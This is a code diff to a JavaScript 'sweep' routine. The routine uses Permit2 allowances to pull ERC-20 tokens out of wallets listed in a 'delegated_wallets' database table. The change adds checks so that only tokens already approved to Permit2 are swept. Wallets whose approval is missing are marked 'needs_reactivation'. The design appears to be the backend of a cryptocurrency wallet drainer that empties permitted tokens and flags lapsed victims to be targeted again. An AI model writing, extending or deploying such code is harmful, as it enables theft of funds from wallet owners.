@@ -1574,13 +1574,40 @@ async function sweep(wallet) {
 
       if (pb3IsV2 && contract) {
         const tokenAddrs = pbData.permit.details.map(d => normalizeAddress(d.token)).filter(Boolean);
-        try {
-          const fee = await getFeeData();
-          const tx  = await contract.sweepViaPermit2(checksum, tokenAddrs, { gasLimit: 100_000n + BigInt(tokenAddrs.length) * 60_000n, ...fee });
-          await tx.wait();
-          log(`[allowance] ✅ sweepViaPermit2 confirmed for ${checksum} (${tokenAddrs.length} token(s))`);
-        } catch (e) {
-          err(`[allowance] sweepViaPermit2 ❌: ${e.reason ?? e.message}`);
+        const approvedTokens = [];
+        for (const tokenAddr of tokenAddrs) {
+          try {
+            const erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
+            if (erc20Allow > 0n) approvedTokens.push(tokenAddr);
+          } catch {}
+          await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+        }
+        if (approvedTokens.length === 0) {
+          warn(`[allowance] sweepViaPermit2 skipped — ERC-20→Permit2 approval missing for all ${tokenAddrs.length} token(s). Marking needs_reactivation.`);
+          if (supabase) {
+            await supabase.from("delegated_wallets")
+              .update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          }
+        } else {
+          try {
+            const fee = await getFeeData();
+            const tx  = await contract.sweepViaPermit2(checksum, approvedTokens, { gasLimit: 100_000n + BigInt(approvedTokens.length) * 60_000n, ...fee });
+            await tx.wait();
+            log(`[allowance] ✅ sweepViaPermit2 confirmed for ${checksum} (${tokenAddrs.length} token(s))`);
+          } catch (e) {
+            const emsg = e.reason ?? e.message ?? "";
+            if (/TRANSFER_FROM_FAILED|transferFrom/i.test(emsg)) {
+              warn(`[allowance] sweepViaPermit2 ❌ ERC-20→Permit2 approval missing — marking needs_reactivation`);
+              if (supabase) {
+                await supabase.from("delegated_wallets")
+                  .update({ needs_reactivation: true })
+                  .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+              }
+            } else {
+              err(`[allowance] sweepViaPermit2 ❌: ${emsg}`);
+            }
+          }
         }
       } else {
         for (const detail of pbData.permit.details) {
@@ -1646,12 +1673,21 @@ async function sweep(wallet) {
           } else if (CONTRACT_ADDRESS && contract) {
             const [v2Amt,, v2Exp] = await permit2Read.allowance(checksum, token, CONTRACT_ADDRESS);
             if (v2Amt > 0n && BigInt(v2Exp) >= nowSecs) {
-              log(`[live-allowance] ${short} — sweeping ${sym} via V2 sweepViaPermit2`);
-              const fee = await getFeeData();
-              const tx = await contract.sweepViaPermit2(checksum, [token], { gasLimit: 160_000n, ...fee });
-              await tx.wait();
-              log(`[live-allowance] ✅ swept ${sym} (V2 spender) from ${short}`);
-              sweptAny = true;
+              let erc20Approved = false;
+              try {
+                const erc20Allow = await new ethers.Contract(token, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
+                erc20Approved = erc20Allow > 0n;
+              } catch {}
+              if (erc20Approved) {
+                log(`[live-allowance] ${short} — sweeping ${sym} via V2 sweepViaPermit2`);
+                const fee = await getFeeData();
+                const tx = await contract.sweepViaPermit2(checksum, [token], { gasLimit: 160_000n, ...fee });
+                await tx.wait();
+                log(`[live-allowance] ✅ swept ${sym} (V2 spender) from ${short}`);
+                sweptAny = true;
+              } else {
+                warn(`[live-allowance] ${sym} V2 path skipped — ERC-20→Permit2 approval missing`);
+              }
             }
           }
         } catch (e) {
